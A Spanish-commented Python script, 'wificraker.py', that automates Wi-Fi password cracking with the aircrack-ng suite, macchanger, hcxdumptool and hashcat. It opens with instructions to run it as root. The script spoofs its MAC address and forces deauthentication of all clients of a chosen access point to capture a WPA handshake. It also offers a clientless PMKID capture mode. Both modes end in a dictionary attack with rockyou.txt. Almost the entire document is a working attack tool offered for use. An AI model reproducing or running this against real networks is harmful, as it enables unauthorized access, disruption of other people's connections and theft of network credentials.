#Ejecutar el script con permisos de root: Para ejecutar el script, debes usar sudo para obtener permisos de root, ya que algunas operaciones requerirán acceso de administrador. Ejecuta el siguiente comando:
#sudo python3 wificraker.py -a Handshake -n wlan0
#Reemplaza Handshake por el modo de ataque que desees (Handshake o PKMID).
#Reemplaza wlan0 por el nombre de tu tarjeta de red inalámbrica. Asegúrate de usar el nombre correcto de tu tarjeta de red.
#Seguir las instrucciones: El script te guiará a través de las operaciones necesarias según el modo de ataque seleccionado. Sigue las instrucciones en la terminal para completar el proceso.
#Finalizar la ejecución: Una vez completado el proceso, el script debería finalizar automáticamente. Si necesitas detenerlo antes, puedes presionar Ctrl+C en la terminal.

import os
import sys
import signal
import subprocess
import argparse

def ctrl_c(sig, frame):
    print("\nSaliendo...")
    subprocess.run(["tput", "cnorm"])
    subprocess.run(["airmon-ng", "stop", f"{network_card}mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["rm", "Captura*"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    sys.exit(0)

def help_panel():
    print("\nUso: ./wificraker.py")
    print("\n\ta) Modo de ataque")
    print("\t\tHandshake")
    print("\t\tPKMID")
    print("\tn) Nombre de la tarjeta de red")
    print("\th) Mostrar este panel de ayuda\n")
    sys.exit(0)

def dependencies():
    subprocess.run(["tput", "civis"])
    os.system('clear')
    dependencies = ["aircrack-ng", "macchanger"]

    print("Comprobando programas necesarios...")
    for program in dependencies:
        print(f"\n[*] Herramienta {program}...", end="")
        result = subprocess.run(["which", program], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if result.returncode == 0:
            print(" (V)")
        else:
            print(" (X)\n")
            print(f"[*] Instalando herramienta {program}...")
            subprocess.run(["apt-get", "install", program, "-y"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def start_attack():
    os.system('clear')
    print("Configurando tarjeta de red...\n")
    subprocess.run(["airmon-ng", "start", network_card], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["ifconfig", f"{network_card}mon", "down"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["macchanger", "-a", f"{network_card}mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["ifconfig", f"{network_card}mon", "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["killall", "dhclient", "wpa_supplicant"], stderr=subprocess.DEVNULL)

    mac_result = subprocess.run(["macchanger", "-s", f"{network_card}mon"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    current_mac = mac_result.stdout.decode().split(" ")[-1].strip()
    print(f"Nueva dirección MAC asignada [{current_mac}]")

    if attack_mode == "Handshake":
        airodump = subprocess.Popen(["xterm", "-hold", "-e", f"airodump-ng {network_card}mon"])
        ap_name = input("\nNombre del punto de acceso: ")
        ap_channel = input("\nCanal del punto de acceso: ")

        airodump.terminate()

        airodump_filter = subprocess.Popen(["xterm", "-hold", "-e", f"airodump-ng -c {ap_channel} -w Captura --essid {ap_name} {network_card}mon"])
        subprocess.run(["sleep", "5"])
        aireplay = subprocess.Popen(["xterm", "-hold", "-e", f"aireplay-ng -0 10 -e {ap_name} -c FF:FF:FF:FF:FF:FF {network_card}mon"])
        subprocess.run(["sleep", "10"])
        aireplay.terminate()

        subprocess.run(["sleep", "10"])
        airodump_filter.terminate()

        subprocess.Popen(["xterm", "-hold", "-e", f"aircrack-ng -w /usr/share/wordlists/rockyou.txt Captura-01.cap"])

    elif attack_mode == "PKMID":
        os.system('clear')
        print("Iniciando ClientLess PKMID Attack...\n")
        subprocess.run(["sleep", "2"])
        subprocess.run(["timeout", "60", "bash", "-c", f"hcxdumptool -i {network_card}mon --enable_status=1 -o Captura"])
        print("\n\nObteniendo Hashes...\n")
        subprocess.run(["sleep", "2"])
        subprocess.run(["hcxpcaptool", "-z", "myHashes", "Captura"])
        subprocess.run(["rm", "Captura"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        if os.path.isfile("myHashes"):
            print("\nIniciando proceso de fuerza bruta...\n")
            subprocess.run(["sleep", "2"])
            subprocess.run(["hashcat", "-m", "16800", "/usr/share/wordlists/rockyou.txt", "myHashes", "-d", "1", "--force"])
        else:
            print("\nNo se ha podido capturar el paquete necesario...\n")
            subprocess.run(["rm", "Captura*"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["sleep", "2"])
    else:
        print("\nEste modo de ataque no es válido\n")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("\nNo soy root\n")
        sys.exit(1)

    parser = argparse.ArgumentParser()
    parser.add_argument("-a", dest="attack_mode", help="Modo de ataque", required=True)
    parser.add_argument("-n", dest="network_card", help="Nombre de la tarjeta de red", required=True)
    args = parser.parse_args()

    attack_mode = args.attack_mode
    network_card = args.network_card

    signal.signal(signal.SIGINT, ctrl_c)

    dependencies()
    start_attack()

    subprocess.run(["tput", "cnorm"])
    subprocess.run(["airmon-ng", "stop", f"{network_card}mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
